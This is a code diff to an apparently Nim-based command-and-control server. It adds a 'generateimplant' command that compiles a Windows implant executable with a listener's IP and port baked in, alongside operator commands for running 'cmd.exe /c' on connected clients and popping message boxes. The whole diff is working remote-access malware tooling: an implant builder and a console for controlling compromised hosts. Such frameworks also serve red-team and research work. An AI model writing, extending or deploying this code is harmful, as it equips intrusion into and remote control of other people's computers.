@@ -1,5 +1,5 @@
 import asyncdispatch, asyncnet, threadpool, asyncfutures
-import strutils, terminal
+import strutils, terminal, osproc, sequtils
 
 import listeners/[tcp]
 import communication
@@ -32,6 +32,8 @@ proc procStdin*(server: C2Server) {.async.} =
             echo "\tstartlistener [type] [..args]\tstart a listener"
             echo "\tlisteners\tshow a list of listeners"
             echo "\tclientlisteners\tshow a list of listeners and their clients"
+            echo "-- Implants"
+            echo "\tgenerateimplant [listener type] [listener ID]\tgenerate an implant"
             echo "-- Managing clients"
             echo "\tclients\tview a list of clients"
             echo "\tinfo\tget info about a client"
@@ -39,6 +41,28 @@ proc procStdin*(server: C2Server) {.async.} =
             echo "\tcmd\trun a cmd command ('cmd.exe /c')"
             echo "\tmsgbox\tsend a message box"
         
+        # implants
+
+        of "generateimplant":
+            let a_args_split = a_args.toLower().split(":")
+            let listenerType = a_args_split[0]
+            let listenerId = parseInt(a_args_split[1])
+            if listenerType == "tcp":
+
+                if len(server.tcpListeners) > listenerId:
+                    let tcpListener = server.tcpListeners[listenerId]
+                    infoLog "generating implant for " & $tcpListener
+                    let ip = tcpListener.listeningIP
+                    let port = tcpListener.port
+                    let exitCode = execCmd("nim c -d:client -d:ip=" & ip & " -d:port=" & $port & " -o:implant.exe .\\src\\client\\client.nim")
+                    # echo outp
+                    if exitCode != 0:
+                        errorLog "failed to build implant for " & $tcpListener
+                    else:
+                        infoLog "saved implant to implant.exe"
+                else:
+                    errorLog "there are no tcp listeners with id " & $listenerId 
+
         # listener management
 
         of "listeners":
@@ -49,12 +73,12 @@ proc procStdin*(server: C2Server) {.async.} =
             for tcpListener in server.tcpListeners:
                 infoLog @tcpListener
                 for client in server.clients:
-                    if client.listenerType == "tcp" and client.listenerId == tcpListener.id:
+                    if client.listenerType == "tcp" and client.listenerId == tcpListener.id and client.connected:
                         infoLog "\t<- " & $client
             infoLog $len(server.tcpListeners) & " listeners"
         of "startlistener":
             if argsn >= 2:
-                if args[1] == "TCP":
+                if args[1].toLower() == "tcp":
                     if argsn >= 4:
                         asyncCheck server.createNewTcpListener(parseInt(args[3]), args[2])
                     else:
